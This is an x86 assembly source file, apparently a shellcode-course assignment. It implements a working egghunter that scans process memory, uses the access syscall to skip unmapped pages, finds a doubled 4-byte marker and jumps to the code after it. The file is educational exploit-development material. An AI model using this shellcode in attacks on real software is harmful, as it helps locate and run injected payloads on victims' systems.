; SLAE Assignment 3
; rgghunter.nasm
; Niels Muskens

global _start

section .text

        _start:
		mov ebx, 0x50905090 	; include 4 byte egg in ebx
		xor ecx, ecx		; clear ecx register
		mul ecx			; clear eax and edx register
		cld			; clear direction flag
newpage:
		or dx, 0xfff		; adding 0x1000 to edx for new page
incedx:
		inc edx			; new page

		pusha			; push all general purpose regs on stack
		lea ebx,[edx+0x4]	; init ebx to address to be validated
		mov al, 0x21		; set syscall to access
		int 0x80		; make the syscall

		cmp al, 0xf2		; check for EFAULT
		popa			; restore general purpose registers
		jz newpage		; goto next region if ZF is set, otherwise start comparing

		cmp [edx], ebx		; compare content of pointer edx with egg in ebx
		jnz incedx			; if no match, jump to inc edx instruction
		cmp [edx+0x4], ebx	; check on existence seconde iteration of egg
		jnz incedx			; if no seconde existence, jump to inc edx instruction
		jmp edx			; Egg has been found, jump to egg execution



